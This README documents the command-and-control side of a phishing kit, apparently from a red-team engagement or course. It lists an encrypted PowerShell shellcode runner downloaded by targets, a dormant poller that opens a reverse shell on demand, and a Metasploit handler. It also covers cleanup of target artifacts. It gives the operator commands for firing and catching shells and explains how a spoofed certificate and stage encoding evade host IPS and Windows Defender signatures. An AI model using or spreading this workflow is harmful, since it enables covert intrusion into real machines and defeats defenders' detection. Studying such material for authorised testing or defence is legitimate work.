# Shared C2 Assets

> **End-to-end build:** see [`../BUILD.md`](../BUILD.md) for the full
> walkthrough from clone to armed, tested payload.

Both phishing vectors point at the same web root and the same Metasploit
handler. This directory holds the C2-side pieces.

## Files

- `run_txt_recipe.md` — how to generate `run.txt`, the ciphered reflective
  PowerShell shellcode runner that both vectors download.
- `activate_poller.ps1` — the PowerShell poller. Runs every five minutes on
  the target; fires a shell only if the C2 serves `/activate` with HTTP 200.
- `handler.rc` — Metasploit resource file. Loads the handler with the
  certificate, stage encoder, and job settings used throughout the
  engagement.
- `cleanup.ps1` — artifact removal checklist. Run on target before
  engagement close.

## Web root layout

    /var/www/html/
    ├── activate       # touch to fire on-demand callback; rm to silence
    ├── run.txt        # ciphered reflective shellcode runner
    └── decoy.html     # optional cover page for the PDF/DOC URL

## On-demand workflow

    # 1. Start the handler (once, backgrounded)
    msfconsole -q -r handler.rc

    # 2. Fire the callback
    sudo touch /var/www/html/activate

    # 3. Wait for session, then silence
    # (in msfconsole)
    sessions -l
    sessions -i <n>
    # back on Kali:
    sudo rm /var/www/html/activate

Between activations the target produces no C2 traffic. This is the point —
the beacon is dormant until the operator wants it, which is far less
detectable than a persistent callback.

## Handler configuration rationale

- `HandlerSSLCert` — a self-signed certificate whose Subject fields mimic a
  known-benign domain. Defeats certificate-signature detection in host-based
  IPS products (Mod 14.3.1).
- `EnableStageEncoding` + `StageEncoder x64/zutto_dekiru` — defeats
  network-traffic signatures that flag the default Meterpreter second stage.
  Windows Defender's WdNisSvc checks network traffic against signatures; this
  is what stops it.
- `ExitOnSession false` — lets the handler catch multiple shells across the
  engagement without restarting.

## Related

- `../BUILD.md` — end-to-end walkthrough
- `../doc/README.md` — DOC vector build
- `../pdf/README.md` — PDF vector build
